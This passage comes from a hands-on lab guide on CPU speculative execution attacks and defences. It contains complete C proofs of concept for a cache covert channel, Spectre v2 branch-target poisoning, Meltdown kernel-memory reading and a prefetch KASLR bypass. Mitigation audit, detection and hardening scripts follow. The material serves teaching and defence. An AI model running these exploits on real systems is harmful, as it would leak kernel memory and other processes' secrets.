    printf("[RECEIVER] Message length: %d bytes\n", len);
    if (len > 1024) { printf("[-] Invalid length, aborting\n"); return; }

    /* Receive message */
    char *received = calloc(len + 1, 1);
    for (int i = 0; i < len; i++) {
        uint8_t byte = 0;
        for (int b = 7; b >= 0; b--) {
            _mm_clflush((void *)data_line);
            _mm_mfence();

            uint64_t deadline = rdtscp_time() + BIT_WINDOW_NS * 3;
            while (rdtscp_time() < deadline) {}

            unsigned int aux;
            uint64_t t0 = __rdtscp(&aux);
            (void)*data_line;
            uint64_t dt = __rdtscp(&aux) - t0;

            int bit = ((int)dt < THRESHOLD) ? 1 : 0;
            byte |= (bit << b);
        }
        received[i] = byte;
    }

    printf("[RECEIVER] Received: \"%s\"\n", received);

    /* Cleanup */
    free(received);
    munmap((void *)shm, SHM_SIZE);
    shm_unlink(SHM_NAME);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s send <message> | recv\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "send") == 0) {
        const char *msg = (argc > 2) ? argv[2] : "Hello from cache covert channel!";
        sender_main(msg);
    } else if (strcmp(argv[1], "recv") == 0) {
        receiver_main();
    }
    return 0;
}
```

**Step 2 — Run:**

```bash
cd /opt/spectre-lab/covert_channel
gcc -O2 -march=native -o covert_channel covert_channel.c -lpthread -lrt

# Terminal 1:
./covert_channel recv

# Terminal 2 (within 500ms):
./covert_channel send "SECRET_EXFILTRATED_VIA_CACHE"
```

**Expected output:**

```
[SENDER] Ready. Shared memory at 0x7f...
[SENDER] Sending: "SECRET_EXFILTRATED_VIA_CACHE" (28 bytes)
[SENDER] Sent 240 bits in 0.048 seconds (5000 bps)

[RECEIVER] Sender detected. Receiving...
[RECEIVER] Message length: 28 bytes
[RECEIVER] Received: "SECRET_EXFILTRATED_VIA_CACHE"
```

---

### Exercise 5: Spectre v2 — BTB Training and Indirect Branch Poisoning

**Objective:** Demonstrate Branch Target Buffer poisoning to redirect speculative execution of an indirect branch in a "victim" function to an attacker-chosen gadget.

```c
/* spectre_v2_btb.c — BTB poisoning demonstration
 * Shows: indirect branch target injection via address aliasing
 * Build: gcc -O1 -march=native -o spectre_v2_btb spectre_v2_btb.c
 * NOTE: Only works with retpoline DISABLED (mitigations=off or spectre_v2=off)
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define PROBE_STRIDE     4096
#define THRESHOLD        100
#define TRAIN_ITERATIONS 5000

static uint8_t probe_array[256 * PROBE_STRIDE];
static char secret[] = "BTB_POISONED_SPECULATIVE_READ";

/* Gadget: speculatively reads secret[idx] and encodes in probe_array */
void __attribute__((noinline)) gadget_function(size_t idx) {
    uint8_t val = secret[idx];
    volatile uint8_t *p = &probe_array[val * PROBE_STRIDE];
    (void)*p;
}

/* Legitimate function (victim's intended indirect branch target) */
void __attribute__((noinline)) safe_function(size_t idx) {
    (void)idx;  /* does nothing sensitive */
}

/* Function pointer — indirect branch target */
typedef void (*func_ptr_t)(size_t);
static volatile func_ptr_t target_func = safe_function;

/* Indirect call site — this is what we're attacking */
void __attribute__((noinline)) indirect_call_site(size_t arg) {
    /* This indirect call goes through the BTB.
     * If we've trained the BTB to predict gadget_function,
     * the CPU speculatively executes gadget_function even though
     * target_func architecturally points to safe_function. */
    target_func(arg);
}

int main(void) {
    printf("=== Spectre v2 — BTB Poisoning Demo ===\n\n");

    memset(probe_array, 0, sizeof(probe_array));

    int len = strlen(secret);
    printf("[*] Secret: \"%s\" (%d bytes)\n", secret, len);
    printf("[*] Training BTB for %d iterations per byte...\n\n", TRAIN_ITERATIONS);

    int success = 0;

    for (int byte_idx = 0; byte_idx < len; byte_idx++) {
        int results[256] = {0};

        for (int attempt = 0; attempt < 100; attempt++) {
            /* Step 1: Flush probe array */
            for (int i = 0; i < 256; i++)
                _mm_clflush(&probe_array[i * PROBE_STRIDE]);
            _mm_mfence();

            /* Step 2: Train BTB — call gadget_function repeatedly
             * through the same indirect call site.
             * The BTB learns: "indirect call at this address → gadget_function" */
            target_func = gadget_function;
            for (int t = 0; t < TRAIN_ITERATIONS; t++) {
                indirect_call_site(byte_idx);
            }

            /* Step 3: Switch to safe target and call —
             * BTB still predicts gadget_function speculatively */
            target_func = safe_function;
            _mm_clflush((void *)&target_func);
            _mm_mfence();
            /* Delay to ensure flush completes (widens speculation window) */
            for (volatile int z = 0; z < 200; z++) {}

            indirect_call_site(byte_idx);

            /* Step 4: Probe for cache hit */
            unsigned int aux;
            for (int i = 0; i < 256; i++) {
                int idx = ((i * 167) + 13) & 0xFF;
                uint64_t t0 = __rdtscp(&aux);
                (void)probe_array[idx * PROBE_STRIDE];
                uint64_t dt = __rdtscp(&aux) - t0;
                if ((int)dt < THRESHOLD) results[idx]++;
            }
        }

        /* Find most-hit entry */
        int best = 0;
        for (int i = 1; i < 256; i++)
            if (results[i] > results[best]) best = i;

        char display = (best > 31 && best < 127) ? (char)best : '?';
        printf("  Byte[%02d]: 0x%02X = '%c' (score=%d) %s\n",
               byte_idx, best, display, results[best],
               (best == (uint8_t)secret[byte_idx]) ? "✓" : "✗");

        if (best == (uint8_t)secret[byte_idx]) success++;
    }

    printf("\n[*] Result: %d/%d correct (%.1f%%)\n",
           success, len, 100.0 * success / len);
    return 0;
}
```

**Build and run:**

```bash
cd /opt/spectre-lab/spectre_v2
gcc -O1 -march=native -fno-inline-small-functions -o spectre_v2_btb spectre_v2_btb.c
./spectre_v2_btb
```

**Verification:**
- [ ] >80% byte recovery on mitigations=off
- [ ] ~0% recovery with retpoline enabled (`spectre_v2=retpoline`)
- [ ] ~0% recovery with eIBRS (`spectre_v2=eibrs` on capable CPU)

---

### Exercise 6: Meltdown — Reading Kernel Memory from User Space

**Objective:** Demonstrate speculative permission-check bypass to read kernel memory (Intel pre-Ice Lake only).

```c
/* meltdown_lab.c — Read kernel memory via exception suppression
 * ONLY WORKS ON: Intel pre-Ice Lake (Skylake through Coffee Lake Refresh)
 * REQUIRES: mitigations=off (KPTI disabled)
 * Build: gcc -O1 -march=native -o meltdown meltdown_lab.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define PROBE_STRIDE     4096
#define THRESHOLD        100
#define ATTEMPTS         1000

static uint8_t probe_array[256 * PROBE_STRIDE] __attribute__((aligned(4096)));
static sigjmp_buf jmp_env;

static void sigsegv_handler(int sig, siginfo_t *si, void *context) {
    (void)sig; (void)si; (void)context;
    siglongjmp(jmp_env, 1);
}

static int read_kernel_byte(uintptr_t kernel_addr) {
    int results[256] = {0};
    unsigned int aux;

    for (int attempt = 0; attempt < ATTEMPTS; attempt++) {
        /* Flush probe array */
        for (int i = 0; i < 256; i++)
            _mm_clflush(&probe_array[i * PROBE_STRIDE]);
        _mm_mfence();

        if (sigsetjmp(jmp_env, 1) == 0) {
            /* The speculative read:
             * On vulnerable CPUs, the load completes speculatively before
             * the permission check retires. The value is used to index
             * into probe_array, leaving a cache footprint.
             * The fault is suppressed via signal handler + longjmp. */
            asm volatile(
                "xorq %%rax, %%rax\n"
                "1:\n"
                "movb (%[kaddr]), %%al\n"     /* speculative kernel read */
                "shlq $12, %%rax\n"            /* multiply by 4096 */
                "jz 1b\n"                      /* retry if transient zero */
                "movq (%[probe], %%rax, 1), %%rbx\n"  /* encode in cache */
                : : [kaddr] "r" (kernel_addr),
                    [probe] "r" (probe_array)
                : "rax", "rbx", "memory"
            );
        }
        /* After SIGSEGV → longjmp lands here */

        /* Probe cache state */
        for (int i = 1; i < 256; i++) {
            int idx = ((i * 167) + 13) & 0xFF;
            if (idx == 0) continue;
            uint64_t t0 = __rdtscp(&aux);
            (void)*(volatile uint8_t *)&probe_array[idx * PROBE_STRIDE];
            uint64_t dt = __rdtscp(&aux) - t0;
            if ((int)dt < THRESHOLD) results[idx]++;
        }
    }

    int best = 1;
    for (int i = 2; i < 256; i++)
        if (results[i] > results[best]) best = i;

    return (results[best] > 3) ? best : -1;
}

int main(int argc, char **argv) {
    printf("=== Meltdown — Kernel Memory Read ===\n\n");

    /* Check CPU vulnerability */
    FILE *f = fopen("/sys/devices/system/cpu/vulnerabilities/meltdown", "r");
    if (f) {
        char buf[256];
        if (fgets(buf, sizeof(buf), f)) {
            printf("[*] Meltdown status: %s", buf);
            if (strstr(buf, "Not affected")) {
                printf("[!] This CPU is NOT vulnerable to Meltdown. Exiting.\n");
                fclose(f);
                return 1;
            }
            if (strstr(buf, "Mitigation: PTI")) {
                printf("[!] KPTI is active — Meltdown is mitigated.\n");
                printf("[!] Reboot with pti=off or mitigations=off to demonstrate.\n");
                fclose(f);
                return 1;
            }
        }
        fclose(f);
    }

    /* Install SIGSEGV handler */
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = sigsegv_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);

    /* Initialize probe array */
    memset(probe_array, 0, sizeof(probe_array));

    /* Target: kernel text segment (typically starts at 0xffffffff81000000)
     * Read /proc/kallsyms to find exact addresses (requires root or
     * kptr_restrict=0) */
    uintptr_t target = 0xffffffff81000000;
    if (argc > 1) target = strtoull(argv[1], NULL, 16);

    int num_bytes = 32;
    if (argc > 2) num_bytes = atoi(argv[2]);

    printf("[*] Reading %d bytes from kernel address 0x%lx\n\n", num_bytes, target);

    int recovered = 0;
    for (int i = 0; i < num_bytes; i++) {
        int val = read_kernel_byte(target + i);
        if (val >= 0) {
            printf("  [0x%lx] = 0x%02x", target + i, val);
            if (val > 31 && val < 127) printf(" '%c'", val);
            printf("\n");
            recovered++;
        } else {
            printf("  [0x%lx] = ?? (no signal)\n", target + i);
        }
    }

    printf("\n[*] Recovered %d/%d bytes (%.1f%%)\n",
           recovered, num_bytes, 100.0 * recovered / num_bytes);

    return 0;
}
```

**Build and run (on vulnerable Intel CPU with pti=off):**

```bash
gcc -O1 -march=native -o meltdown meltdown_lab.c
# Only on pre-Ice Lake Intel with mitigations=off:
sudo ./meltdown 0xffffffff81000000 32
```

**Expected output (vulnerable system):**

```
=== Meltdown — Kernel Memory Read ===

[*] Meltdown status: Vulnerable
[*] Reading 32 bytes from kernel address 0xffffffff81000000

  [0xffffffff81000000] = 0x48 'H'
  [0xffffffff81000001] = 0x8d
  [0xffffffff81000002] = 0x2d
  ...

[*] Recovered 28/32 bytes (87.5%)
```

**Verification:**
- [ ] Correctly identifies non-vulnerable CPUs (AMD, Intel Ice Lake+)
- [ ] Correctly identifies active KPTI mitigation
- [ ] >50% byte recovery on vulnerable+unmitigated system
- [ ] 0% recovery with KPTI enabled (kernel pages unmapped from user page table)

---

### Exercise 7: TLB Side Channel Timing

**Objective:** Demonstrate prefetch-based KASLR bypass by distinguishing mapped from unmapped kernel addresses via timing.

```c
/* prefetch_kaslr.c — KASLR bypass via prefetch timing
 * Demonstrates: mapped vs unmapped address timing differential
 * Build: gcc -O2 -march=native -o prefetch_kaslr prefetch_kaslr.c
 * NOTE: May not work with full KPTI (user page table has no kernel mappings)
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

#define KERNEL_BASE_MIN   0xffffffff80000000ULL
#define KERNEL_BASE_MAX   0xffffffffc0000000ULL
#define KERNEL_ALIGN      0x200000ULL  /* 2MB alignment (typical) */
#define SAMPLES_PER_ADDR  1000
#define PREFETCH_THRESHOLD 50  /* cycles difference indicating mapped page */

static inline uint64_t time_prefetch(void *addr) {
    unsigned int aux;
    uint64_t t0 = __rdtscp(&aux);
    asm volatile("prefetcht0 (%0)" :: "r" (addr));
    return __rdtscp(&aux) - t0;
}

int main(void) {
    printf("=== Prefetch-based KASLR Bypass ===\n\n");

    /* Check if KPTI will prevent this */
    FILE *f = fopen("/sys/devices/system/cpu/vulnerabilities/meltdown", "r");
    if (f) {
        char buf[256];
        if (fgets(buf, sizeof(buf), f) && strstr(buf, "Mitigation: PTI")) {
            printf("[!] KPTI active — prefetch KASLR bypass may not work\n");
            printf("[!] (Kernel pages unmapped from user page table)\n");
            printf("[*] Demonstrating timing differential anyway...\n\n");
        }
        fclose(f);
    }

    printf("[*] Scanning kernel address range:\n");
    printf("    Min: 0x%llx\n", (unsigned long long)KERNEL_BASE_MIN);
    printf("    Max: 0x%llx\n", (unsigned long long)KERNEL_BASE_MAX);
    printf("    Step: 0x%llx (2MB)\n", (unsigned long long)KERNEL_ALIGN);
    printf("    Samples per address: %d\n\n", SAMPLES_PER_ADDR);

    uint64_t best_addr = 0;
    uint64_t best_time = UINT64_MAX;

    /* Baseline: time a definitely-unmapped address */
    uint64_t unmapped_time = 0;
    void *unmapped = (void *)0xffffffff00000000ULL;
    for (int i = 0; i < SAMPLES_PER_ADDR; i++)
        unmapped_time += time_prefetch(unmapped);
    unmapped_time /= SAMPLES_PER_ADDR;
    printf("[*] Unmapped baseline: %lu cycles\n\n", (unsigned long)unmapped_time);

    int candidates = 0;
    for (uint64_t addr = KERNEL_BASE_MIN; addr < KERNEL_BASE_MAX;
         addr += KERNEL_ALIGN) {
        uint64_t total = 0;
        for (int i = 0; i < SAMPLES_PER_ADDR; i++)
            total += time_prefetch((void *)addr);
        uint64_t avg = total / SAMPLES_PER_ADDR;

        /* Mapped pages resolve faster (TLB hit from prior walk) */
        if (avg < unmapped_time - PREFETCH_THRESHOLD) {
            printf("  [CANDIDATE] 0x%llx — avg=%lu (delta=%ld)\n",
                   (unsigned long long)addr, (unsigned long)avg,
                   (long)(unmapped_time - avg));
            candidates++;
            if (avg < best_time) {
                best_time = avg;
                best_addr = addr;
            }
        }
    }

    if (candidates > 0) {
        printf("\n[+] Best candidate kernel base: 0x%llx (timing=%lu)\n",
               (unsigned long long)best_addr, (unsigned long)best_time);
    } else {
        printf("\n[-] No candidates found (KPTI likely preventing timing leak)\n");
    }

    /* Verify against actual base if accessible */
    f = fopen("/proc/kallsyms", "r");
    if (f) {
        char line[256];
        if (fgets(line, sizeof(line), f)) {
            uint64_t actual = strtoull(line, NULL, 16);
            if (actual != 0) {
                uint64_t actual_base = actual & ~(KERNEL_ALIGN - 1);
                printf("[*] Actual kernel base (from kallsyms): 0x%llx\n",
                       (unsigned long long)actual_base);
                if (best_addr != 0) {
                    printf("[*] Distance from guess: %lld bytes\n",
                           (long long)(best_addr - actual_base));
                }
            }
        }
        fclose(f);
    }

    return 0;
}
```

---

### Exercise 8: eBPF Speculative Bounds Bypass (Historical)

**Objective:** Understand the historical eBPF Spectre v1 attack vector — how unprivileged BPF programs could speculatively bypass verifier-imposed bounds checks.

```c
/* ebpf_spectre_concept.c — Conceptual demonstration of eBPF Spectre v1
 * This is an EDUCATIONAL demonstration showing the BPF bytecode pattern
 * that was exploitable before mitigations. It does NOT load actual BPF.
 *
 * The concept: BPF verifier ensures bounds at architectural level,
 * but speculative execution can bypass the conditional branch.
 */
#include <stdio.h>
#include <stdint.h>
#include <string.h>

/* Simulated BPF instruction set for educational purposes */
typedef struct {
    uint8_t  opcode;
    uint8_t  dst_reg:4;
    uint8_t  src_reg:4;
    int16_t  off;
    int32_t  imm;
} bpf_insn_t;

/* BPF opcodes (subset) */
#define BPF_LD_MEM_B  0x71  /* r_dst = *(u8 *)(r_src + off) */
#define BPF_JGE_REG   0x3d  /* if r_dst >= r_src goto +off */
#define BPF_LSH_IMM   0x67  /* r_dst <<= imm */
#define BPF_ADD_REG   0x0f  /* r_dst += r_src */
#define BPF_MOV_IMM   0xb7  /* r_dst = imm */
#define BPF_EXIT      0x95  /* exit */

void explain_ebpf_spectre(void) {
    printf("=== eBPF Spectre v1 Attack Pattern (Educational) ===\n\n");

    printf("The vulnerable BPF program pattern:\n\n");
    printf("  r6 = attacker_controlled_index (from BPF map)\n");
    printf("  r7 = probe_array_base (BPF map, 256*4096 bytes)\n");
    printf("  r8 = array_size (from BPF map)\n");
    printf("\n");
    printf("  if (r6 >= r8) goto skip;    ← verifier validates this bound\n");
    printf("  // --- speculative path on misprediction: ---\n");
    printf("  r0 = *(u8 *)(r6 + 0);       ← OOB read (kernel address)\n");
    printf("  r0 <<= 12;                   ← multiply by 4096\n");
    printf("  r0 += r7;                    ← probe_array + secret*4096\n");
    printf("  r0 = *(u8 *)(r0 + 0);       ← encode in cache\n");
    printf("  // skip:\n");
    printf("  r0 = 0;\n");
    printf("  exit;\n\n");

    printf("Attack steps:\n");
    printf("  1. Load BPF prog via bpf(BPF_PROG_LOAD) — verifier passes\n");
    printf("     (bounds check is architecturally correct)\n");
    printf("  2. Invoke BPF prog repeatedly with in-bounds index\n");
    printf("     (trains PHT: branch predicted as 'not taken' → enters body)\n");
    printf("  3. Set r6 to kernel address (via BPF map write)\n");
    printf("  4. Invoke BPF prog — PHT mispredicts, speculative OOB read\n");
    printf("  5. From userspace, probe BPF map (probe_array) via Flush+Reload\n");
    printf("     to recover the secret byte\n\n");

    printf("Mitigations (all now active by default):\n");
    printf("  [1] kernel.unprivileged_bpf_disabled=1 (default since 5.16)\n");
    printf("  [2] lfence after bounds checks in BPF JIT output\n");
    printf("  [3] array_index_nospec() in BPF map lookup paths\n");
    printf("  [4] Speculative-aware verifier (tracks 'speculatively unbounded')\n\n");

    /* Check current system state */
    FILE *f = fopen("/proc/sys/kernel/unprivileged_bpf_disabled", "r");
    if (f) {
        int val;
        fscanf(f, "%d", &val);
        fclose(f);
        printf("Current system: unprivileged_bpf_disabled = %d (%s)\n",
               val, val ? "MITIGATED" : "VULNERABLE");
    }
}

int main(void) {
    explain_ebpf_spectre();

    printf("\n--- Verifying BPF mitigation status ---\n\n");

    /* Check all relevant sysctls */
    const char *checks[] = {
        "/proc/sys/kernel/unprivileged_bpf_disabled",
        "/proc/sys/net/core/bpf_jit_enable",
        "/proc/sys/net/core/bpf_jit_harden",
        NULL
    };

    for (int i = 0; checks[i]; i++) {
        FILE *f = fopen(checks[i], "r");
        if (f) {
            char val[64];
            if (fgets(val, sizeof(val), f)) {
                val[strcspn(val, "\n")] = 0;
                printf("  %-50s = %s\n", checks[i], val);
            }
            fclose(f);
        }
    }

    return 0;
}
```

---

## PART B: DEFENSIVE (Protection Systems)

### Exercise 9: Mitigation Verification and Audit

**Objective:** Build a comprehensive auditing tool that checks all speculative execution mitigations and reports gaps.

```bash
#!/bin/bash
# spectre_audit.sh — Complete speculative execution mitigation audit
# Run as root for full visibility
set -euo pipefail

echo "╔══════════════════════════════════════════════════════════════════╗"
echo "║     Speculative Execution Mitigation Audit                      ║"
echo "╠══════════════════════════════════════════════════════════════════╣"
printf "║ Host:      %-52s ║\n" "$(hostname)"
printf "║ Kernel:    %-52s ║\n" "$(uname -r)"
printf "║ CPU:       %-52s ║\n" "$(grep -m1 'model name' /proc/cpuinfo | cut -d: -f2 | xargs)"
printf "║ Microcode: %-52s ║\n" "$(grep -m1 'microcode' /proc/cpuinfo | cut -d: -f2 | xargs)"
printf "║ Date:      %-52s ║\n" "$(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "╚══════════════════════════════════════════════════════════════════╝"
echo ""

CRITICAL=0; HIGH=0; OK=0; NA=0

assess() {
    local name="$1" status="$2" severity="OK"

    if echo "$status" | grep -qi "vulnerable"; then
        severity="CRITICAL"; ((CRITICAL++))
    elif echo "$status" | grep -qi "not affected"; then
        severity="N/A"; ((NA++))
    elif echo "$status" | grep -qi "mitigation"; then
        severity="OK"; ((OK++))
    else
        severity="HIGH"; ((HIGH++))
    fi

    local color=""
    case $severity in
        CRITICAL) color="\033[1;31m" ;;
        HIGH)     color="\033[1;33m" ;;
        OK)       color="\033[1;32m" ;;
        N/A)      color="\033[0;37m" ;;
    esac

    printf "${color}[%-8s]  %-30s  %s\033[0m\n" "$severity" "$name" "$status"
}

echo "=== Kernel Vulnerability Status ==="
echo ""

for vuln_file in /sys/devices/system/cpu/vulnerabilities/*; do
    name=$(basename "$vuln_file")
    status=$(cat "$vuln_file" 2>/dev/null || echo "unreadable")
    assess "$name" "$status"
done

echo ""
echo "=== Boot Parameters ==="
echo ""
CMDLINE=$(cat /proc/cmdline)
echo "  $CMDLINE"
echo ""

# Check specific mitigations
echo "=== Detailed Mitigation Checks ==="
echo ""

# Retpoline
if grep -q "retpoline" /proc/cpuinfo 2>/dev/null || \
   dmesg 2>/dev/null | grep -qi "retpoline"; then
    echo "  [OK]       Retpoline: Available"
else
    echo "  [INFO]     Retpoline: Not detected (may use eIBRS instead)"
fi

# eIBRS
if grep -qi "eIBRS\|Enhanced IBRS" /sys/devices/system/cpu/vulnerabilities/spectre_v2 2>/dev/null; then
    echo "  [OK]       eIBRS: Active"
else
    echo "  [INFO]     eIBRS: Not active (using retpoline or IBRS)"
fi

# KPTI
if grep -qi "PTI\|pti" /sys/devices/system/cpu/vulnerabilities/meltdown 2>/dev/null; then
    echo "  [OK]       KPTI: Active"
elif grep -qi "Not affected" /sys/devices/system/cpu/vulnerabilities/meltdown 2>/dev/null; then
    echo "  [N/A]      KPTI: Not needed (hardware not vulnerable)"
else
    echo "  [CRITICAL] KPTI: NOT ACTIVE on vulnerable hardware"
fi

# SMT status
SMT=$(cat /sys/devices/system/cpu/smt/active 2>/dev/null || echo "unknown")
echo "  [INFO]     SMT: $SMT (1=enabled, 0=disabled)"

# unprivileged BPF
BPF_DISABLED=$(cat /proc/sys/kernel/unprivileged_bpf_disabled 2>/dev/null || echo "unknown")
if [ "$BPF_DISABLED" = "1" ] || [ "$BPF_DISABLED" = "2" ]; then
    echo "  [OK]       Unprivileged BPF: Disabled ($BPF_DISABLED)"
else
    echo "  [HIGH]     Unprivileged BPF: ENABLED (Spectre v1 vector)"
    ((HIGH++))
fi

# TSX
TSX_STATUS=$(dmesg 2>/dev/null | grep -i "tsx" | tail -1 || echo "")
if echo "$TSX_STATUS" | grep -qi "disabled"; then
    echo "  [OK]       TSX: Disabled"
elif grep -qo 'rtm' /proc/cpuinfo 2>/dev/null; then
    echo "  [HIGH]     TSX: ENABLED (TAA/Meltdown fast-path risk)"
    ((HIGH++))
else
    echo "  [N/A]      TSX: Not supported"
fi

# Core scheduling
CORE_SCHED=$(cat /proc/sys/kernel/sched_core_enabled 2>/dev/null || echo "0")
echo "  [INFO]     Core scheduling: $CORE_SCHED"

# PCID (performance — KPTI without PCID is very expensive)
if grep -qo 'pcid' /proc/cpuinfo; then
    echo "  [OK]       PCID: Supported (KPTI TLB optimization)"
else
    echo "  [INFO]     PCID: Not supported (KPTI overhead will be higher)"
fi

echo ""
echo "════════════════════════════════════════════════════════"
printf "  Summary: OK=%d  N/A=%d  HIGH=%d  CRITICAL=%d\n" $OK $NA $HIGH $CRITICAL
echo "════════════════════════════════════════════════════════"

if [ $CRITICAL -gt 0 ]; then
    echo ""
    echo "  ⚠  ACTION REQUIRED: $CRITICAL unmitigated critical vulnerabilities!"
    exit 2
elif [ $HIGH -gt 0 ]; then
    echo ""
    echo "  ⚠  REVIEW: $HIGH items need attention."
    exit 1
else
    echo ""
    echo "  All speculative execution mitigations verified."
    exit 0
fi
```

**Run:**

```bash
chmod +x spectre_audit.sh
sudo ./spectre_audit.sh
```

---

### Exercise 10: eBPF-Based Real-Time Cache Anomaly Detection

**Objective:** Deploy eBPF programs that monitor hardware performance counters for cache-timing attack indicators.

**Step 1 — bpftrace one-liner for quick detection:**

```bash
# Real-time cache anomaly monitor
sudo bpftrace -e '
hardware:cache-misses:1000 {
    @miss[pid, comm] = count();
}
hardware:cache-references:1000 {
    @ref[pid, comm] = count();
}

interval:s:5 {
    printf("\n=== Cache Activity (5-second window) ===\n");
    printf("%-8s %-20s %10s %10s %8s\n", "PID", "COMM", "MISSES", "REFS", "RATIO");
    printf("─────────────────────────────────────────────────────────────\n");

    // Alert on high miss ratios
    print(@miss);
    print(@ref);
    clear(@miss);
    clear(@ref);
}
'
```

**Step 2 — Full eBPF detection program (libbpf):**

```c
/* cache_attack_detector.bpf.c — eBPF kernel-side program
 * Detects: high cache miss rates, clflush bursts, suspicious perf_event_open
 * Compile: clang -O2 -target bpf -D__TARGET_ARCH_x86 \
 *          -c cache_attack_detector.bpf.c -o cache_attack_detector.bpf.o
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#define ALERT_THRESHOLD_MISS_RATIO  80   /* percent */
#define ALERT_THRESHOLD_PERF_OPENS  10   /* per minute */
#define TASK_COMM_LEN               16

struct alert_event {
    __u32 pid;
    __u32 uid;
    __u64 timestamp_ns;
    char  comm[TASK_COMM_LEN];
    __u32 alert_type;  /* 1=cache_anomaly, 2=perf_event_open, 3=mmap_shared */
    __u64 value1;
    __u64 value2;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} alerts SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 4096);
    __type(key, __u32);    /* pid */
    __type(value, __u32);  /* perf_event_open count */
} perf_open_count SEC(".maps");

/* Detect perf_event_open syscall (timing measurement setup) */
SEC("tracepoint/syscalls/sys_enter_perf_event_open")
int detect_perf_event_open(struct trace_event_raw_sys_enter *ctx) {
    __u32 pid = bpf_get_current_pid_tgid() >> 32;
    __u32 uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;

    /* Increment per-PID counter */
    __u32 *count = bpf_map_lookup_elem(&perf_open_count, &pid);
    if (count) {
        __sync_fetch_and_add(count, 1);
        if (*count > ALERT_THRESHOLD_PERF_OPENS) {
            struct alert_event *evt = bpf_ringbuf_reserve(&alerts, sizeof(*evt), 0);
            if (evt) {
                evt->pid = pid;
                evt->uid = uid;
                evt->timestamp_ns = bpf_ktime_get_ns();
                bpf_get_current_comm(evt->comm, sizeof(evt->comm));
                evt->alert_type = 2;
                evt->value1 = *count;
                evt->value2 = 0;
                bpf_ringbuf_submit(evt, 0);
            }
        }
    } else {
        __u32 init = 1;
        bpf_map_update_elem(&perf_open_count, &pid, &init, BPF_ANY);
    }
    return 0;
}

/* Detect MAP_SHARED mmap of libraries (Flush+Reload prerequisite) */
SEC("tracepoint/syscalls/sys_enter_mmap")
int detect_shared_mmap(struct trace_event_raw_sys_enter *ctx) {
    /* args: addr, len, prot, flags, fd, offset */
    unsigned long flags = ctx->args[3];

    /* MAP_SHARED = 0x01 */
    if (flags & 0x01) {
        __u32 pid = bpf_get_current_pid_tgid() >> 32;
        __u32 uid = bpf_get_current_uid_gid() & 0xFFFFFFFF;

        /* Only alert for non-root processes */
        if (uid > 0) {
            struct alert_event *evt = bpf_ringbuf_reserve(&alerts, sizeof(*evt), 0);
            if (evt) {
                evt->pid = pid;
                evt->uid = uid;
                evt->timestamp_ns = bpf_ktime_get_ns();
                bpf_get_current_comm(evt->comm, sizeof(evt->comm));
                evt->alert_type = 3;
                evt->value1 = ctx->args[1]; /* length */
                evt->value2 = flags;
                bpf_ringbuf_submit(evt, 0);
            }
        }
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
```

**Step 3 — Userspace loader and alert handler:**

```python
#!/usr/bin/env python3
"""cache_attack_monitor.py — Userspace component for eBPF cache attack detector
Usage: sudo python3 cache_attack_monitor.py
"""
import subprocess
import time
import json
import sys
from datetime import datetime, timezone

ALERT_TYPES = {
    1: "CACHE_ANOMALY",
    2: "PERF_EVENT_OPEN_BURST",
    3: "MAP_SHARED_MMAP",
}

def monitor_perf_counters():
    """Monitor cache miss ratios using perf stat"""
    print("[*] Starting performance counter monitor...")
    print("[*] Alert threshold: cache miss ratio > 80%")
    print("")

    while True:
        try:
            result = subprocess.run(
                ["perf", "stat", "-e", "cache-misses,cache-references",
                 "-a", "-I", "5000", "--no-big-num"],
                capture_output=True, text=True, timeout=10
            )

            for line in result.stderr.split('\n'):
                if 'cache-misses' in line and '#' in line:
                    # Parse percentage from perf output
                    parts = line.split('#')
                    if len(parts) > 1:
                        pct_str = parts[1].strip().split('%')[0].strip()
                        try:
                            pct = float(pct_str)
                            if pct > 80.0:
                                ts = datetime.now(timezone.utc).isoformat()
                                print(f"[ALERT] {ts} CACHE_MISS_RATIO={pct:.1f}% "
                                      f"(threshold: 80%)")
                        except ValueError:
                            pass
        except subprocess.TimeoutExpired:
            continue
        except KeyboardInterrupt:
            break

def monitor_with_bpftrace():
    """Use bpftrace for combined monitoring"""
    script = """
    tracepoint:syscalls:sys_enter_perf_event_open {
        @perf_opens[pid, comm] = count();
    }

    tracepoint:syscalls:sys_enter_mmap /args->flags & 1/ {
        @shared_mmaps[pid, comm] = count();
    }

    interval:s:10 {
        printf("\\n--- 10s window @ %s ---\\n", strftime("%H:%M:%S", nsecs));
        print(@perf_opens);
        print(@shared_mmaps);
        clear(@perf_opens);
        clear(@shared_mmaps);
    }
    """

    print("[*] Starting bpftrace monitor...")
    proc = subprocess.Popen(
        ["bpftrace", "-e", script],
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
    )

    try:
        for line in proc.stdout:
            print(line, end='')
    except KeyboardInterrupt:
        proc.terminate()

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--bpftrace":
        monitor_with_bpftrace()
    else:
        monitor_perf_counters()
```

**Step 4 — Deploy and test:**

```bash
# Terminal 1: Start detector
sudo python3 cache_attack_monitor.py

# Terminal 2: Run Spectre v1 PoC (should trigger alerts)
cd /opt/spectre-lab/spectre_v1 && ./spectre_v1

# Expected: detector reports cache miss ratio spike
```

---

### Exercise 11: Comprehensive Hardening Deployment

**Objective:** Apply and verify all speculative execution hardening measures across boot parameters, kernel config, and runtime settings.

```bash
#!/bin/bash
# apply_spectre_hardening.sh — Full speculative execution hardening
# Run as root. Creates backup of current config.
set -euo pipefail

